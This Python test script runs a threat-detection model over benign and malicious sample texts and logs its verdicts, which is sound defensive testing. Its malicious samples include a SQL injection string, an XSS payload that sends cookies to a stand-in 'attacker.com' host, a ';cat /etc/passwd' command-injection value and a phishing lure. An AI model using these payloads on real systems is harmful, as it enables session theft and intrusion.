#!/usr/bin/env python
"""
Test script for the SecurityModel with Lily-Cybersecurity-7B-v0.2.

This script demonstrates how to use the SecurityModel for threat detection
with examples of both benign and malicious inputs.
"""

import logging
import argparse
import sys
import os
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.ai.models import SecurityModel, RobustSecurityModel

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Example texts for testing
EXAMPLE_TEXTS = {
    "benign": [
        "Please provide me with information about cybersecurity best practices.",
        "I need to reset my password. What's the recommended approach?",
        "How can I secure my home Wi-Fi network?",
        "What are the OWASP Top 10 security risks?",
    ],
    "malicious": [
        "Here's a SQL injection: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'",
        "I'm going to use a cross-site scripting attack: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "Let me try to get your system info: command execution exploit: ;cat /etc/passwd",
        "This is a phishing attempt: Your account has been compromised. Click here to verify your identity: [fake-bank-site.com]",
    ]
}

def test_security_model(model_path=None, use_robust=False, device=None):
    """Test the security model with example texts."""
    logger.info("Initializing SecurityModel...")
    
    if use_robust:
        model_class = RobustSecurityModel
        logger.info("Using RobustSecurityModel for enhanced detection")
    else:
        model_class = SecurityModel
        logger.info("Using standard SecurityModel")
    
    # Initialize the model
    model_kwargs = {}
    if model_path:
        model_kwargs["model_name_or_path"] = model_path
    if device:
        model_kwargs["device"] = device
        
    model = model_class(**model_kwargs)
    logger.info(f"Model initialized: {model.model_name}")
    
    # Test with benign examples
    logger.info("\n--- Testing with benign examples ---")
    for i, text in enumerate(EXAMPLE_TEXTS["benign"]):
        logger.info(f"\nBenign Example {i+1}:")
        logger.info(f"Text: {text[:100]}..." if len(text) > 100 else f"Text: {text}")
        
        # Predict and generate explanation
        prediction = model.predict(text)
        explanation = model.generate_explanation(text, prediction)
        
        logger.info(f"Is Threat: {prediction['is_threat']}")
        logger.info(f"Confidence: {prediction['confidence']:.2f}")
        if prediction['is_threat']:
            logger.info(f"Threat Type: {prediction['threat_type']}")
        logger.info(f"Explanation: {explanation[:200]}..." if len(explanation) > 200 else f"Explanation: {explanation}")
        
    # Test with malicious examples
    logger.info("\n--- Testing with malicious examples ---")
    for i, text in enumerate(EXAMPLE_TEXTS["malicious"]):
        logger.info(f"\nMalicious Example {i+1}:")
        logger.info(f"Text: {text[:100]}..." if len(text) > 100 else f"Text: {text}")
        
        # Predict and generate explanation
        prediction = model.predict(text)
        explanation = model.generate_explanation(text, prediction)
        
        logger.info(f"Is Threat: {prediction['is_threat']}")
        logger.info(f"Confidence: {prediction['confidence']:.2f}")
        if prediction['is_threat']:
            logger.info(f"Threat Type: {prediction['threat_type']}")
        logger.info(f"Explanation: {explanation[:200]}..." if len(explanation) > 200 else f"Explanation: {explanation}")

def main():
    """Main function to parse arguments and run the test."""
    parser = argparse.ArgumentParser(description="Test the SecurityModel with examples")
    parser.add_argument("--model", "-m", type=str, help="Path to a custom model")
    parser.add_argument("--robust", "-r", action="store_true", help="Use the robust security model")
    parser.add_argument("--device", "-d", type=str, help="Device to run on (cuda or cpu)")
    
    args = parser.parse_args()
    
    test_security_model(args.model, args.robust, args.device)

if __name__ == "__main__":
    main() 